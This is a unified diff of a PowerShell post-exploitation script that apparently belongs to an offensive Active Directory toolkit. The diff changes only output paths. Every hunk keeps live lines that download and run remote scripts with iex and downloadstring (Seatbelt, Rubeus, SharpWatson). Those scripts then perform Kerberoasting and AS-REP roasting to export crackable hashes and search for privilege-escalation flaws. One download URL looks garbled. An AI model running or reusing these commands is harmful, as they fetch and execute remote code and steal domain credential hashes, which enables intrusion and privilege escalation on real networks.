@@ -1,13 +1,13 @@
 
             Write-Host -ForegroundColor Yellow 'Executing Seatbelt.'
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
-            if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" >> "$currentPath\LocalPrivesc\Seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" }
+            if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" >> "C:\sh_adm_mtrx\seatbelt\seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" }
            
             Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting.'
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPackerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
             if(!$consoleoutput){
-                Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\ASreproasting.txt" 
-                Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\Kerberoasting_Rubeus.txt"
+                Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:C:\sh_adm_mtrx\Kerbero\ASreproasting.txt" 
+                Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:C:\sh_adm_mtrx\Kerbero\Kerberoasting_Rubeus.txt"
                
             }
             else
@@ -19,7 +19,7 @@
             Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson.'
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
             if(!$consoleoutput){
-                Invoke-watson >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+                Invoke-watson >> C:\sh_adm_mtrx\\Privilege_Escalation_Vulns.txt
                 
             }
             else
